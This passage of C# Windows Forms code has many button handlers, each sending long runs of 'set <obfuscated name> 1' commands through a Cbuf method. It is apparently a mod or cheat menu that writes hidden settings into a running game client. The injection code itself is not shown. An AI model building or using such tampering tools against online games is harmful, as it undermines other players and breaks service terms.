            this.Cbuf("set NMLOKNMRSK 1");
            this.Cbuf("set LQKTTRTSNS 1");
            this.Cbuf("set NQOLQLNOQO 1");
            this.Cbuf("set LOQOSQQLQK 1");
            this.Cbuf("set LKTNPTORLS 1");
            this.Cbuf("set LPLLPRNPST 1");
            this.Cbuf("set TMRQLOTLT 1");
            this.Cbuf("set LMLRPPRNKR 1");
            this.Cbuf("set MRPKPQQPKP 1");
            this.Cbuf("set MQSKKKQNNK 1");
            this.Cbuf("set OMLKKRRSS 1");
            this.Cbuf("set LKOMKROSMT 1");
            this.Cbuf("set MTRTKMSRLO 1");
            this.Cbuf("set LNSRONSPMP 1");
            this.Cbuf("set MMOPMNOKPO 1");
            this.Cbuf("set MTTRPTOLPL 1");
            this.Cbuf("set OLNLKLMSTR 1");
            this.Cbuf("set LQMSSRNNKQ 1");
            this.Cbuf("set LPPTSMNPKK 1");
            this.Cbuf("set RLLNPQQQ 1");
            this.Cbuf("set LLPTKKRNN 1");
            this.Cbuf("set OKROOSNNRL 1");
            this.Cbuf("set LKNKQKQQKN 1");
            this.Cbuf("set ORNKMLNPS 1");
            this.Cbuf("set NLNLTPOORT 1");
            this.Cbuf("set NOPROTMONL 1");
            this.Cbuf("set TMPRTPPTL 1");
            this.Cbuf("set MPPNTMTPTS 1");
            this.Cbuf("set POPROMRKQ 1");
            this.Cbuf("set LLNLPRNKRS 1");
            this.Cbuf("set OLSNNOLSTO 1");
            this.Cbuf("set OKSKNRLPNR 1");
            this.Cbuf("set LKKMTSKQTP 1");
            this.Cbuf("set NTKQMLLQOP 1");
            this.Cbuf("set MNMKTKKNQQ 1");
            this.Cbuf("set NRKLOPNTNL 1");
            this.Cbuf("set NSOSPTMRMQ 1");
            this.Cbuf("set LTKRSOQLRQ 1");
            this.Cbuf("set LONMSLNTTS 1");
            this.Cbuf("set LKPMRNMOOT 1");
            this.Cbuf("set NKONRLPQSQ 1");
            this.Cbuf("set RQMTPQRRL 1");
            this.Cbuf("set RSLSNSOPN 1");
            this.Cbuf("set MRPRKRSLNR 1");
            this.Cbuf("set OMLTNNTSLK 1");
            this.Cbuf("set MQQLSTRTKL 1");
            this.Cbuf("set MLKNOOOLLN 1");
            this.Cbuf("set NOMMPMROTT 1");
            this.Cbuf("set SQMPNNMSP 1");
            this.Cbuf("set LQNPPQNOOS 1");
            this.Cbuf("set MNMRPMRPPN 1");
            this.Cbuf("set LPNLLTPOKO 1");
            this.Cbuf("set MLTSQPQPLT 1");
            this.Cbuf("set MOLSPKLNLK 1");
            this.Cbuf("set MNRLRONMKL 1");
            this.Cbuf("set OSNONQTOL 1");
            this.Cbuf("set PQOLTLLTQ 1");
            this.Cbuf("set OKQRPLOSKP 1");
            this.Cbuf("set LMNLTPTQR 1");
            this.Cbuf("set NRMKPMKOQP 1");
            this.Cbuf("set OMPLNRSPOM 1");
            this.Cbuf("set MROLOMMTTM 1");
            this.Cbuf("set MOSOTQRPLP 1");
            this.Cbuf("set POKRTSLMN 1");
            this.Cbuf("set NPKRMNSKRM 1");
            this.Cbuf("set MMSRMPTSNP 1");
            this.Cbuf("set MNRSPPTRRM 1");
            this.Cbuf("set MRKPLKOPNR 1");
            this.Cbuf("set LPKNMLSRN 1");
            this.Cbuf("set NKMRKQMOSN 1");
            this.Cbuf("set MQRNKOQNOK 1");
            this.Cbuf("set NOQRQOQSKS 1");
            this.Cbuf("set NNOLSPSORR 1");
            this.Cbuf("set NQRKPOPLLR 1");
            this.Cbuf("set TMMPLPSKM 1");
            this.Cbuf("set MPSOOTLNOR 1");
            this.Cbuf("set NNSKQOMQMK 1");
            this.Cbuf("set NKNKQNTPQK 1");
            this.Cbuf("set MNTTNLMOKR 1");
            this.Cbuf("set NSLRMNQORK 1");
            this.Cbuf("set NNOPQMLNLN 1");
            this.Cbuf("set TQMSKKKTS 1");
            this.Cbuf("set NSLPPROQQT 1");
            this.Cbuf("set MOPTLNSSTM 1");

        }

        private void metroButton25_Click_2(object sender, EventArgs e)
        {
           
            this.Cbuf("set OMKSOSNLRR 1");
            this.Cbuf("set NQLLTLSRQS 1");
            this.Cbuf("set NPOMMNSONS 1");
            this.Cbuf("set MKONTLSQQN 1");
            this.Cbuf("set MRNRLLPTNK 1");
            this.Cbuf("set NQOMMSSMNT 1");
            this.Cbuf("set MKRKSPRLLT 1");
            this.Cbuf("set MRROROQKQQ 1");
            this.Cbuf("set MMOOKLNONM 1");
            this.Cbuf("set LKPTPTSPOP 1");
            this.Cbuf("set OKSTSKLQQQ 1");
            this.Cbuf("set QOQRRPPPT 1");
            this.Cbuf("set NMQORRQKRT 1");
            this.Cbuf("set MQRSRNLR 1");
            this.Cbuf("set NNKSRRNOLO 1");
            this.Cbuf("set MTOQSKOLL 1");
        }

        private void metroButton26_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set OKRSNPKTLS 1");
            this.Cbuf("set LNMNLQP 1");
            this.Cbuf("set MPNNNKPLQM 1");
            this.Cbuf("set LSKTQNPKKN 1");
            this.Cbuf("set MMPNQSNSNN 1");
            this.Cbuf("set OOPPRRRSM 1");
            this.Cbuf("set MLQKNLMPQR 1");
            this.Cbuf("set MORKNPPSMR 1");
            this.Cbuf("set SQPLNKSOK 1");
            this.Cbuf("set NTLRRMTQMM 1");
            this.Cbuf("set MQLTOQPRLT 1");
            this.Cbuf("set LPOLPTMPKM 1");
            this.Cbuf("set SSOOSTOMR 1");
            this.Cbuf("set  MKOLLTMMLM 1");
            this.Cbuf("set  NMTQNKOOS 1");
            this.Cbuf("set MTNTQNKMPO 1");
            this.Cbuf("set MKMSOLRQML 1");
            this.Cbuf("set  NOLNTMSMPL 1");
            this.Cbuf("set NTSOOPTPOL 1");
            this.Cbuf("set NTKRNNLQOQ 1");
            this.Cbuf("set MRKNLKLOLP 1");
            this.Cbuf("set MMRNPTNSQ 1");
            this.Cbuf("set LRQMRKNTLL 1");
            this.Cbuf("set RLPKRTSLO 1");
            this.Cbuf("set NLPKLPMKT 1");
            this.Cbuf("set MPSRKPSRQQ 1");
            this.Cbuf("set LSTNPLKNLS 1");
        }

        private void metroButton27_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set OMKSOSNLRR 1");
            this.Cbuf("set NQLLTLSRQS 1");
            this.Cbuf("set NPOMMNSONS 1");
            this.Cbuf("set MKONTLSQQN 1");
            this.Cbuf("set MRNRLLPTNK 1");
            this.Cbuf("set NQOMMSSMNT 1");
            this.Cbuf("set MKRKSPRLLT 1");
            this.Cbuf("set MRROROQKQQ 1");
            this.Cbuf("set MMOOKLNONM 1");
            this.Cbuf("set LKPTPTSPOP 1");
            this.Cbuf("set OKSTSKLQQQ 1");
            this.Cbuf("set QOQRRPPPT 1");
            this.Cbuf("set NMQORRQKRT 1");
            this.Cbuf("set MQRSRNLR 1");
            this.Cbuf("set NNKSRRNOLO 1");
            this.Cbuf("set MTOQSKOLL 1");
            this.Cbuf("set NSLSMQTMSS 1");
            this.Cbuf("set LPNTMKLSSR 1");
            this.Cbuf("set MKKPMNNPQK 1");
            this.Cbuf("set MLOMMRLKRL 1");
            this.Cbuf("set NOTMMNOSQO 1");
            this.Cbuf("set LOOSQMLOLN 1");
            this.Cbuf("set TKPMPLQQ 1");
            this.Cbuf("set MKTLKSMQLP 1");
            this.Cbuf("set MRSTSRLQKL 1");
            this.Cbuf("set LLQPMRNTP 1");
            this.Cbuf("set NNOKMOPPPP 1");
            this.Cbuf("set OLSTQTTPLO 1");
            this.Cbuf("set NRRKTONLNK 1");
            this.Cbuf("set NOTTPOPTSQ 1");
            this.Cbuf("set MMKKTLQSPK 1");
            this.Cbuf("set MSKSKSPQRM 1");
            this.Cbuf("set LTMQPKTPQQ 1");
            this.Cbuf("set LMSRLQMQTK 1");
            this.Cbuf("set NPLTQSPNRL 1");
            this.Cbuf("set MLQKLMSRST 1");
            this.Cbuf("set MNNSLRRMNL 1");
            this.Cbuf("set NPLMROSQKM 1");
            this.Cbuf("set LLOLKOLPMN 1");
            this.Cbuf("set LLQLKSMMTO 1");
            this.Cbuf("set MLQMNPQNOP 1");
            this.Cbuf("set MPQLRTKSPM 1");
            this.Cbuf("set MNQRLPRQOP 1");
            this.Cbuf("set OLPKRPRLPM 1");
            this.Cbuf("set TMQTSMRPS 1");
            this.Cbuf("set LTTOPRNTON 1");
            this.Cbuf("set LMLLSTRMSQ 1");
            this.Cbuf("set RORQSKTLT 1");
            this.Cbuf("set OKTLSQMTOP 1");
            this.Cbuf("set NTNLSSTMQK 1");
            this.Cbuf("set PORQNRQP 1");
            this.Cbuf("set LPNRRKQQQO 1");
            this.Cbuf("set MMPRQRSPOP 1");
            this.Cbuf("set NLQKPRSMLT 1");
            this.Cbuf("set NOPLNKORSM 1");
            this.Cbuf("set LKRKKMPKQN 1");
            this.Cbuf("set MMLKKNQTRS 1");
            this.Cbuf("set TKPTLPSNR 1");
            this.Cbuf("set LSLRLKSNM 1");
            this.Cbuf("set MTTKNLQQQP 1");
            this.Cbuf("set LMRRQQOKO 1");
            this.Cbuf("set LOLMPNLQLK 1");
            this.Cbuf("set LNNTTKNOPT 1");
            this.Cbuf("set MROQSKORRK 1");
            this.Cbuf("set OKRSNPKTLS 1");
            this.Cbuf("set LNMNLQP 1");
            this.Cbuf("set MPNNNKPLQM 1");
            this.Cbuf("set LSKTQNPKKN 1");
            this.Cbuf("set MMPNQSNSNN 1");
            this.Cbuf("set OOPPRRRSM 1");
            this.Cbuf("set MLQKNLMPQR 1");
            this.Cbuf("set MORKNPPSMR 1");
            this.Cbuf("set SQPLNKSOK 1");
            this.Cbuf("set NTLRRMTQMM 1");
            this.Cbuf("set MQLTOQPRLT 1");
            this.Cbuf("set LPOLPTMPKM 1");
            this.Cbuf("set SSOOSTOMR 1");
            this.Cbuf("set  MKOLLTMMLM 1");
            this.Cbuf("set  NMTQNKOOS 1");
            this.Cbuf("set MTNTQNKMPO 1");
            this.Cbuf("set MKMSOLRQML 1");
            this.Cbuf("set  NOLNTMSMPL 1");
            this.Cbuf("set NTSOOPTPOL 1");
            this.Cbuf("set NTKRNNLQOQ 1");
            this.Cbuf("set MRKNLKLOLP 1");
            this.Cbuf("set MMRNPTNSQ 1");
            this.Cbuf("set LRQMRKNTLL 1");
            this.Cbuf("set RLPKRTSLO 1");
            this.Cbuf("set NLPKLPMKT 1");
            this.Cbuf("set MPSRKPSRQQ 1");
            this.Cbuf("set LSTNPLKNLS 1");
        }

        private void groupBox14_Enter(object sender, EventArgs e)
        {

        }

        private void metroButton12_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set BJCGHFBEDF 1");
            this.Cbuf("set DAACJFEEDC 1");
            this.Cbuf("set BBAICIAGH 1");
            this.Cbuf("set DBGFIDHBFC 1");
            this.Cbuf("set DHEEJCCJBH 1");
            this.Cbuf("set CFHDGABACF 1");
            this.Cbuf("set BJJCJHDBII 1");
            this.Cbuf("set GDDCIAIIG 1");
            this.Cbuf("set IBEGCHEFE 1");
            this.Cbuf("set BDHJDHBBGG 1");
            this.Cbuf("set DBCJGCDGDI 1");
            this.Cbuf("set BGAAHHAGAC 1");
            this.Cbuf("set HDGDBCJFG 1");
            this.Cbuf("set  DDJFBBJAIG 1");
            this.Cbuf("set  CBBFHGEDGJ 1");
            this.Cbuf("set CFJGJBIDHI 1");
            this.Cbuf("set EAIICIFIFA 1");
            this.Cbuf("set  EAAHGICFBD 1");
            this.Cbuf("set CAADCDEEIA 1");
            this.Cbuf("set ECHCFGDDDF 1");
            this.Cbuf("set BHICADFIHA 1");
            this.Cbuf("set DBJHBACBBE 1");
            this.Cbuf("set BGIBDIBHH 1");
            this.Cbuf("set BJFFDBJHDD 1");
            this.Cbuf("set CCCCACICHH 1");
            this.Cbuf("set EBDDFIIHID 1");
            this.Cbuf("set MNRQQOMSMM 1");
            this.Cbuf("set NSNSNQTRON 1");
            this.Cbuf("set NQTSOQQRKT 1");
            this.Cbuf("set MMLLKRSKMR 1");
            this.Cbuf("set LNSOPSPTO 1");
            this.Cbuf("set SKQPQQNS 1");
            this.Cbuf("set LTLOOSMMTQ 1");
            this.Cbuf("set MTKKKTNKRS 1");
            this.Cbuf("set QTQNPTNTL 1");
            this.Cbuf("set NSRNPQOMLO 1");
            this.Cbuf("set NQMMNTSQNS 1");
        }

        private void metroButton11_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set MSNKLLSORM 1");
            this.Cbuf("set OMKTKNNRNM 1");
            this.Cbuf("set LMQRKPOLTL 1");
            this.Cbuf("set LRTNOSMQNK 1");
            this.Cbuf("set MQPTPTQSMN 1");
            this.Cbuf("set TNTMMQQLP 1");
            this.Cbuf("set NTMPMPNTOR 1");
            this.Cbuf("set SKQOKNNRK 1");
            this.Cbuf("set PKNOSRPLT 1");
            this.Cbuf("set LLQPNKQQKR 1");
            this.Cbuf("set SNQORQKMP 1");
            this.Cbuf("set MQRMPRPQPR 1");
            this.Cbuf("set NMLMMPLPQ 1");
            this.Cbuf("set OMKTMROMTS 1");
            this.Cbuf("set MRRLOSOKTP 1");
            this.Cbuf("set sun_flare 1");
            this.Cbuf("set NTPNRQTKNP 1");
            this.Cbuf("set TSSONTORK 1");
            this.Cbuf("set NTSMKLPMNK 1");
            this.Cbuf("set MLSRLRMOLL 1");
            this.Cbuf("set MOLQOKOQLQ 1");
            this.Cbuf("set MMLSMTQOSM 1");
            this.Cbuf("set ALQSQNMSSLS 1");
            this.Cbuf("set NKLMONNPNN 1");
            this.Cbuf("set PKKMTTRQO 1");
            this.Cbuf("set MKSKRRMQMN 1");
            this.Cbuf("set MKRPMLRRLS 1");
            this.Cbuf("set LSLMOQSNTL 1");
            this.Cbuf("set SQPOKKMP 1");
            this.Cbuf("set MKPPNSLNQQ 1");
            this.Cbuf("set QQNKRMKPQ 1");
            this.Cbuf("set NKOSNKPNKL 1");
            this.Cbuf("set MTORLPNK 1");
            this.Cbuf("set OLPRLSRQLM 1");
            this.Cbuf("set MPLOLNMSRO 1");
            this.Cbuf("set NMQSKQNQLR 1");
            this.Cbuf("set NQQSKRQMTS 1");
            this.Cbuf("set NSKKMRPOQQ1");
            this.Cbuf("set LTROMKSMSS 1");
            this.Cbuf("set QPLMKRON 1");
            this.Cbuf("set MTKPSMMLLR 1");
            this.Cbuf("set NOSQLKNSQO 1");
            this.Cbuf("set LMNOQSTMKN 1");
            this.Cbuf("set TSPOQPTMS 1");
            this.Cbuf("set LTKPSMSTQO 1");
            this.Cbuf("set NPONLLLSPL 1");
            this.Cbuf("set LSNRQTOKRR 1");
            this.Cbuf("set NTLKNLNPLK 1");
            this.Cbuf("set MROOOROPKL 1");
            this.Cbuf("set LTQMSPKRKO 1");
            this.Cbuf("set LLNMKLQQP 1");
            this.Cbuf("set NRSOTSLSSO 1");
            this.Cbuf("set RSLTKLOS 1");
            this.Cbuf("set MNQKPNLOPT 1");
            this.Cbuf("set TLMMOPMSK 1");
            this.Cbuf("set NMSPMRQSMS 1");
            this.Cbuf("set NLOOTLTMMQ 1");
            this.Cbuf("set NSMRSOKML 1");
            this.Cbuf("set SONQQSQRQ 1");
            this.Cbuf("set TMNTMTQRM 1");
            this.Cbuf("set NKPRRSKNOP 1");
            this.Cbuf("set LKOLRONRNQ 1");
            this.Cbuf("set LTMPKRLLNM 1");
            this.Cbuf("set OLPNKQKKTT 1");
        }

        private void metroButton6_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set SRQLQNLMK 1");
            this.Cbuf("set QSLRKRNKL 1");
            this.Cbuf("set QSTSONPTR 1");
            this.Cbuf("set  NORMLOSRMM 1");
            this.Cbuf("set  LQLMTQMMKQ 1");
            this.Cbuf("set NSSMQLPRNT 1");
            this.Cbuf("set LSLKRQNSQS 1");
            this.Cbuf("set  MTRRKPRML 1");
            this.Cbuf("set NKPSNPTQMM 1");
            this.Cbuf("set MSOOKLOQTQ 1");
            this.Cbuf("set MSMTMNTLMQ 1");
            this.Cbuf("set LROOQPKSOQ 1");
            this.Cbuf("set LTPONKTQLN 1");
            this.Cbuf("set MLKOSLONLQ 1");
            this.Cbuf("set NMROQRRONQ 1");
            this.Cbuf("set MKOQSSQKLL 1");
            this.Cbuf("set MPLQQOTMSP 1");
            this.Cbuf("set MKMNNOKRSP 1");
            this.Cbuf("set LOKPRQTTQK 1");
            this.Cbuf("set LRMPROLMKN 1");
            this.Cbuf("set NTOSKSTKQQ 1");
            this.Cbuf("set NSNOLMTLLL 1");
            this.Cbuf("set LSRTPRNOLS 1");
            this.Cbuf("set LNNOSQKRTP 1");
            this.Cbuf("set RKSQOKQNK 1");
            this.Cbuf("set OLPPQTQPSR 1");
            this.Cbuf("set QNTNNSMKR 1");
            this.Cbuf("set MLQRRTPPLQ 1");
            this.Cbuf("set MTSLMPMTTM 1");
            this.Cbuf("set MSTTNLLRLS 1");
            this.Cbuf("set LKSOROSOQK 1");
            this.Cbuf("set LKQMTLKPMM 1");
            this.Cbuf("set NTRTRQMQNL 1");
            this.Cbuf("set NMSNTQSMLL 1");
            this.Cbuf("set MROQPTNONR 1");
            this.Cbuf("set NQQLKRLTSN 1");
            this.Cbuf("set LSTKPKPRSO 1");
            this.Cbuf("set RLNOTPQPK 1");
            this.Cbuf("set MRQTKQSMR 1");
            this.Cbuf("set NSRQQKNSNR 1");
            this.Cbuf("set LRPNLRLPMT 1");
            this.Cbuf("set LQRKORLQML 1");
            this.Cbuf("set NTNOPTNMPP 1");
            this.Cbuf("set MPKOKPNLN 1");
            this.Cbuf("set LTTSTKSPNT 1");
            this.Cbuf("set OKQKMLSMPN 1");
            this.Cbuf("set NSSMRLPRPL 1");
            this.Cbuf("set MKOPMKKPOS 1");
            this.Cbuf("set MNLLLPQSP 1");
            this.Cbuf("set MNNRTQNNNT 1");
            this.Cbuf("set QQMRRKSLP 1");
        }

        private void metroButton5_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MRMMQQKQKN 1");
            this.Cbuf("set LQQOQNNMT 1");
            this.Cbuf("set OMROPMNPTT 1");
            this.Cbuf("set MLMRSONLSL 1");
            this.Cbuf("set MMTLNMQKTT 1");
            this.Cbuf("set MSOLOMSKNN 1");
            this.Cbuf("set LPRNOKPONK 1");
            this.Cbuf("set LQKKPSLSKL 1");
            this.Cbuf("set LRPKORNQON 1");
            this.Cbuf("set NKPLSKPRPK 1");
            this.Cbuf("set NSQQNSTTTQ 1");
            this.Cbuf("set NPPSOKOPLP 1");
            this.Cbuf("set SOPRNKQTK 1");
            this.Cbuf("set NORTRORSRN 1");
            this.Cbuf("set LTTSMMPPKS 1");
            this.Cbuf("set MSLLOSOLPO 1");
            this.Cbuf("set NOSNORMOSQ 1");
            this.Cbuf("set RTOOKRTNO 1");
            this.Cbuf("set NLSORKMPKT 1");
            this.Cbuf("set NQSOKPOQOT 1");
            this.Cbuf("set MQLOPKSOTR 1");
            this.Cbuf("set NKLMPPPPSO 1");
            this.Cbuf("set MKTMRSKPTS 1");
            this.Cbuf("set LRPMOPMPO 1");
            this.Cbuf("set SNMNOPMSO 1");
            this.Cbuf("set LTSLSKSLQL 1");
            this.Cbuf("set RRNOPTNLL 1");
            this.Cbuf("set LSOMOKRRSK 1");
            this.Cbuf("set MTMOPKMRLQ 1");
            this.Cbuf("set NNNONTLLNN 1");
            this.Cbuf("set QMOROTSKT 1");
            this.Cbuf("set NSQOPNTOPL 1");
            this.Cbuf("set NRQSSSNTSQ 1");
            this.Cbuf("set LNROSLQKON 1");
            this.Cbuf("set MRMTONLNRL 1");
            this.Cbuf("set QPQSLLTNS 1");
            this.Cbuf("set LSNMSLSMP 1");
            this.Cbuf("set LKMPRNTMOO 1");
            this.Cbuf("set OKRNQTRNOT 1");
            this.Cbuf("set NKRONMQOKP 1");
            this.Cbuf("set MRPTLLLPRL 1");
            this.Cbuf("set NPSSLTOOSN 1");
        }

        private void metroButton4_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LNQLSMPML 1");
            this.Cbuf("set NROPOPRSKR 1");
            this.Cbuf("set LRPMPMOMLR 1");
            this.Cbuf("set LORQPQRONQ 1");
            this.Cbuf("set MSROQTTQNS 1");
            this.Cbuf("set NLQNNKSRLP 1");
            this.Cbuf("set OTRLKTPNR 1");
            this.Cbuf("set LSTQROTOLP 1");
            this.Cbuf("set NTSSRTTPMS 1");
            this.Cbuf("set MKPPTNNORL 1");
            this.Cbuf("set PKTSLMMNL 1");
            this.Cbuf("set LKTNLSTTMM 1");
            this.Cbuf("set NTTOKPMPRT 1");
            this.Cbuf("set NMQMMPSNRK 1");
            this.Cbuf("set LTQLMSLNPQ 1");
            this.Cbuf("set LMQKOKMQMR 1");
            this.Cbuf("set OMNNSMTSPS 1");
            this.Cbuf("set MOKLRORTMM 1");
            this.Cbuf("set NLNOPSQKNR 1");
            this.Cbuf("set PPPPLMRRR 1");
            this.Cbuf("set MPOOTPQLL 1");
            this.Cbuf("set OMNONNMOTP 1");
            this.Cbuf("set MKSLSOSQON 1");
            this.Cbuf("set LSORSSTOSK 1");
            this.Cbuf("set LPQMKKOMNT 1");
            this.Cbuf("set MLPTMNQLTN 1");
            this.Cbuf("set MPNPLTKNQK 1");
            this.Cbuf("set NKNPMMRQKO 1");
            this.Cbuf("set NTKMMLKST 1");
            this.Cbuf("set NQSKNTTTQN 1");
            this.Cbuf("set NNLKQPQSSP 1");
            this.Cbuf("set MNOOQSTKQN 1");
            this.Cbuf("set MOOMLTQTLL 1");
            this.Cbuf("set NQRLRSQMRS 1");
            this.Cbuf("set MNPSTNRLMS 1");
            this.Cbuf("set MTLNTSOKQL 1");

        }

        private void metroButton17_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MTMOLSNRTK 1");
            this.Cbuf("set OLQTKKONKT 1");
            this.Cbuf("set NQLOTSRTQR 1");
            this.Cbuf("set LQQMNNQPON 1");
            this.Cbuf("set MQMRKTQPKL 1");
        }

        private void metroButton21_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MOPMOKNOQS 1");
            this.Cbuf("set LQNPSOKKQT 1");
            this.Cbuf("set NKLQKPPOMR 1");
        }

        private void metroButton22_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set NNQQMLKMOT 1");
            this.Cbuf("set SMPPQTSMN 1");
            this.Cbuf("set LONTRSOSTR 1");
            this.Cbuf("set LOKNMMPRKT 1");
            this.Cbuf("set MNTSRLRPQO 1");
            this.Cbuf("set NRNSQKTKTP 1");
            this.Cbuf("set LOPLNPRKMP 1");
            this.Cbuf("set NQQSMKLKRO 1");
            this.Cbuf("set OPTMSRPOS 1");
            this.Cbuf("set NPSNRPPQNP 1");
        }

        private void metroButton24_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set TTKLLTLMP 1");
            this.Cbuf("set LKSQPTSMPR 1");
            this.Cbuf("set LMORSKSTPK 1");
            this.Cbuf("set NOPKLKMSRM 1");
            this.Cbuf("set LMTKLROPNM 1");
            this.Cbuf("set NPQOMTNPOQ 1");
        }

        private void metroButton10_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MTSTOMNOL 1");
            this.Cbuf("set MLRKNQPRMN 1");
            this.Cbuf("set LRLSQPKNL 1");
            this.Cbuf("set LOSKLQNMQR 1");
            this.Cbuf("set MONSNMPSQK 1");
            this.Cbuf("set MKQQOKLSTK 1");
            this.Cbuf("set NQKRTLNOMR 1");
            this.Cbuf("set MLTSKTRKRK 1");
            this.Cbuf("set LRMSOKMKRM 1");
            this.Cbuf("set RRKMTKPPP 1");
            this.Cbuf("set LSNOMRTLRR 1");
            this.Cbuf("set MOQPKPQMP 1");
            this.Cbuf("set NSPQOSROQP 1");
            this.Cbuf("set OLLKNMRRLO 1");
            this.Cbuf("set NRQPOOTKSK 1");
            this.Cbuf("set MQTLLRKRSR 1");
            this.Cbuf("set LRKPOKNKRM 1");
            this.Cbuf("set PRLKTLTQN 1");
            this.Cbuf("set MPLORMMQPT 1");
            this.Cbuf("set QLQPPSRK 1");
            this.Cbuf("set LMSLOSMKTT 1");
            this.Cbuf("set NSPMTTPLRO 1");
            this.Cbuf("set LKSPMSTKMK 1");
            this.Cbuf("set LMKPKOTROK 1");
            this.Cbuf("set MSSKROSOKP 1");
            this.Cbuf("set NRQLTOMPLT 1");
            this.Cbuf("set OLMNOPRRL 1");
            this.Cbuf("set NLQLSQRNNL 1");
            this.Cbuf("set MTPPMPMTQP 1");
            this.Cbuf("set RQLSPRTTL 1");
            this.Cbuf("set MKPPTQMNQN 1");
            this.Cbuf("set MLOROPNTP 1");
            this.Cbuf("set LMRSLTQLKN 1");
            this.Cbuf("set MLKRKRSQQM 1");
            this.Cbuf("set LPNRKRNNQP 1");
            this.Cbuf("set MTQTSPMTOP 1");
        }

        private void metroButton13_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set QMSKSNLNK 1");
            this.Cbuf("set MNKLKSPRT 1");
            this.Cbuf("set LTOKRMRTMM 1");
            this.Cbuf("set NNTOQLMSLO 1");
            this.Cbuf("set MPMQRLKQQN 1");
            this.Cbuf("set NTROOKOSPM 1");
            this.Cbuf("set NRSLPQLQPL 1");
            this.Cbuf("set LNKPMNNMQM 1");
            this.Cbuf("set NSKLNSKLPS 1");
            this.Cbuf("set MRKLKLNQKN 1");
            this.Cbuf("set MPTORROPSS 1");
            this.Cbuf("set NLOLPSPLKT 1");
            this.Cbuf("set LQSQRPPNQR 1");
            this.Cbuf("set NLOTLQMORR 1");
            this.Cbuf("set NMOOTRKLKR 1");
            this.Cbuf("set NTSQPNPMOO 1");
            this.Cbuf("set LRSMQMLQNQ 1");
            this.Cbuf("set NPOMMSROSL 1");
            this.Cbuf("set MKNOSRKSKL 1");
            this.Cbuf("set NLROTMNPKO 1");
            this.Cbuf("set LTMMNRMOPM 1");
            this.Cbuf("set PLLNLOTON 1");
            this.Cbuf("set LQNTQSSNSS 1");
            this.Cbuf("set LOKPNNNNSO 1");
            this.Cbuf("set OKKTPRPONL 1");
            this.Cbuf("set LPKPSMMQOL 1");
            this.Cbuf("set NOOTPPOPSQ 1");
            this.Cbuf("set LSRLSMKMTP 1");
            this.Cbuf("set MRQTRLKMTN 1");
            this.Cbuf("set MOPRLRTMSK 1");
            this.Cbuf("set NMLNMRNNKQ 1");
            this.Cbuf("set OLQOMOOMRP 1");
            this.Cbuf("set MLRKRSTMRO 1");
            this.Cbuf("set NSSOKNLRPQ 1");
            this.Cbuf("set TROPRPKTK 1");
            this.Cbuf("set RNNNLQSRS 1");
        }

        private void metroButton14_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MLPKPLMNLT 1");
            this.Cbuf("set TMKMSLQSR 1");
            this.Cbuf("set NNPPONORK 1");
            this.Cbuf("set MNNLNMSSRM 1");
            this.Cbuf("set TSNNNOLOQ 1");
            this.Cbuf("set MQOMSSQRRQ 1");
            this.Cbuf("set MLNLRLRPQL 1");
            this.Cbuf("set NLQKNTQSNT 1");
            this.Cbuf("set NONPSOKLR 1");
            this.Cbuf("set PMKRPQLPM 1");
            this.Cbuf("set NSQSKRKPOM 1");
            this.Cbuf("set NSLRSQLMSL 1");
            this.Cbuf("set MRMPTNMLP 1");
            this.Cbuf("set NMLLTNKPMK 1");
            this.Cbuf("set MKLQLQLQNO 1");
            this.Cbuf("set MPRNRNTNNQ 1");
            this.Cbuf("set MNOLLPSQSS 1");
            this.Cbuf("set OLONSLNOPK 1");
            this.Cbuf("set MPOKKOPMTN 1");
            this.Cbuf("set LPSQKOLTLS 1");
            this.Cbuf("set OLNKQKOTLK 1");
            this.Cbuf("set MRRMSTNPMR 1");
            this.Cbuf("set LSLPORSMRK 1");
            this.Cbuf("set MLNONSKNKO 1");
            this.Cbuf("set LSRSKPMRSM 1");
            this.Cbuf("set MRKTMQLPLR 1");
            this.Cbuf("set LSKNTKKQSP 1");
            this.Cbuf("set LTKPMMQONS 1");
            this.Cbuf("set OKRTQNSQMQ 1");
            this.Cbuf("set NKNSKKLNMN 1");
            this.Cbuf("set NKTLSLKQS 1");
            this.Cbuf("set MOMOSTNNQ 1");
            this.Cbuf("set NOMOROLLMQ 1");
            this.Cbuf("set QQQOTOROT 1");
            this.Cbuf("set NRLNMQROLR 1");
            this.Cbuf("set PQPNNMOM 1");
        }

        private void metroButton16_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set NTQOKMQPLS 1");
            this.Cbuf("set NQLOOOOQPN 1");
            this.Cbuf("set LRLLOSTTOR 1");
            this.Cbuf("set OKSSTSKKOQ 1");
            this.Cbuf("set MSLSKNLMNR 1");
            this.Cbuf("set ORMNKNLLN 1");
            this.Cbuf("set MTTNLPMNR 1");
            this.Cbuf("set LSLQPLNLQL 1");
            this.Cbuf("set LQLTTSTOQM 1");
            this.Cbuf("set MSKMKKSPLM 1");
            this.Cbuf("set OMTMTQKNSR 1");
            this.Cbuf("set MTSPTMRLRO 1");
            this.Cbuf("set NKRMKSLMSS 1");
            this.Cbuf("set NQKSNKLLO 1");
            this.Cbuf("set MKMQSONMSN 1");
            this.Cbuf("set NQPTLKMSNO 1");
            this.Cbuf("set NRNOLQMMON 1");
            this.Cbuf("set NKTROPPTRS 1");
            this.Cbuf("set LTKKLTRKLT 1");
            this.Cbuf("set LOKPQTOPSM 1");
            this.Cbuf("set LTQRQNQOKT 1");
            this.Cbuf("set MORLKTLOSS 1");
            this.Cbuf("set OMOLRNRTOK 1");
            this.Cbuf("set LMONTKNNTT 1");
            this.Cbuf("set NTLQORNPLQ 1");
            this.Cbuf("set NORPKSSOQO 1");
            this.Cbuf("set NQMNTPLRLR 1");
            this.Cbuf("set NKTLTLTMSO 1");
            this.Cbuf("set MQOPSKPOQS 1");
            this.Cbuf("set MPOPRKKSM 1");
            this.Cbuf("set LOSKTOORPK 1");
            this.Cbuf("set NONLNTKTQL 1");
